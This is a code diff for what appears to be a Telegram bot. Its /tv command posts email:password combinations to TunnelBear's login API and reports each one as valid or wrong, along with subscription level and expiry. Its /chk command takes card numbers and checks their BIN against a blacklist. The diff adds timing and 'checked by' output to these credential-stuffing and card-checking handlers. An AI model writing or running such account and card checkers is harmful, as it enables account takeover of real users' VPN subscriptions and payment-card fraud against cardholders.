@@ -37,7 +37,7 @@ async def tv(message: types.Message):
     password = splitter[1]
     if not ac:
         return await message.reply(
-            "<code>Send ac /tv email|pass.</code>"
+            "<code>Send ac /tv email:pass.</code>"
         )
     session = requests.session()
     payload = {
@@ -55,12 +55,15 @@ async def tv(message: types.Message):
     
     r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                      data=payload, headers=headers)
+    toc = time.perf_counter()
     
     # capture ac details
     if "Access denied" in r.text:
         await message.reply(f"""
 <b>COMBO</b>➟ <code>{ac}</code>
 <b>STATUS</b>➟ ❌WRONG DETAILS
+TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
 """)
     elif "PASS" in r.text:
         res = r.json()
@@ -69,6 +72,7 @@ async def tv(message: types.Message):
 <b>STATUS</b>➟ ✅VALID
 <b>LEVEL</b>➟ {res['details']['bearType']}
 <b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
+TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
 """)
     else:
@@ -80,7 +84,7 @@ async def ch(message: types.Message):
     tic = time.perf_counter()
     await message.answer_chat_action("typing")
     cc = message.text[len('/chk '):]
-    _bin = cc[0:10]
+    _bin = cc[0:11]
     if _bin in BLACKLISTED:
         return await message.reply(
             "<b>BLACKLISTED BIN</b>"
